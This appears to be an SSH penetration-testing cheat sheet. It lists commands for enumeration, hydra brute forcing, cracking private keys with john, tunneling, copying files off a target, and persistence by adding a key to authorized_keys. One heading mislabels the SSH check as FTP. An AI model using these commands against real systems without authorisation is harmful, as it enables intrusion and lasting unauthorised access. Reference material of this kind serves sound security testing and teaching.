Secure Shell (SSH) is a protocol used to securely connect to another computer over a network. 
It allows you to log into another computer, execute commands, and transfer files, all in a secure manner. 
This is because SSH encrypts your connection, making it difficult for hackers to intercept and understand the data being exchanged.
It's commonly used by network administrators to control web servers, by developers to access programming environments, and by anyone needing secure access to a computer over the internet.

Default Port: 22


-- Connect --

ssh username@X.X.X.X
ssh -i path/to/private_key user@target-ip

Install PuTTY and run it then enter target IP address and port(22 by default) also choose to connect type as SSH.


-- Enumeration --

➜ Identifying an FTP Server

nmap -p 22 X.X.X.X

➜ Banner Grabbing

nc -vn X.X.X.X 22

➜ Automated audit with ssh-audit

ssh-audit X.X.X.X 22

➜ Identify Authentication Methods with Nmap

nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 X.X.X.X

➜ User Enumeration with Metasploit

msfconsole
msf> use auxiliary/scanner/ssh/ssh_enumusers


-- Attack Vectors --

hydra -l user -P /path/to/wordlist.txt ssh://X.X.X.X

/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=path/to/wordlist.txt id_rsa.hash


-- Post-Exploitation --

➜ Port Forwarding

ssh -L localPort:remoteHost:remotePort user@sshServer
ssh -R remotePort:localHost:localPort user@sshServer

➜ SSH Tunneling

ssh -D 8080 user@X.X.X.X

➜ File Transfer

scp user@target-ip:/path/to/remote/file /path/to/local/destination  # Download files
scp /path/to/local/file user@target-ip:/path/to/remote/destination  # Upload files

sftp user@target-ip

➜ Command Execution

ssh user@target-ip 'command_to_run'

➜ Maintaining Access

echo your_public_key >> ~/.ssh/authorized_keys

➜ Privilege Escalation

ssh user@target-ip 'sudo -l'
